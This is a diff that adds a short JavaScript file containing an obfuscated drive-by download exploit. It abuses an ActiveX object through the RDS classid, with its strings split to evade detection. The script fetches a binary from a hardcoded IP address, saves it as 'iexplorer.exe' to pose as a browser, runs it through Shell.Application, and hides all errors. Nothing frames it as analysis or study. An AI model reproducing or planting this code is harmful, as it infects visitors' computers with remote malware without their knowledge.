@@ -1,0 +1,19 @@
+start();
+function start() {
+var gff = document.createElement('object');
+gff.setAttribute('id','gff');
+gff.setAttribute('classid','cl'+'si'+"d:BD"+"96C5"+'56-65A3-1'+"1D0-98"+'3A-00'+"C04"+'FC2'+"9E"+'36');
+try {
+var q = gff.CreateObject('ms'+"xm"+'l2'+"."+'XM'+"LH"+'T'+'TP','');
+var s = gff.CreateObject("Shel"+"l.Ap"+"pl"+"icati"+"on",'');
+var t = gff.CreateObject('ad'+'od'+"b."+'st'+"re"+'am','');
+try { t.type = 1;
+q.open('G'+"E"+'T','http://58.65.232.33/gpack/load.php',false);
+q.send(); t.open();
+t.Write(q.responseBody);
+var name = './/..//iexplorer.exe';
+t.SaveToFile(name,2);
+t.Close();
+} catch(e) {}
+try { s.shellexecute(name); } catch(e) {}}
+catch(e){}}
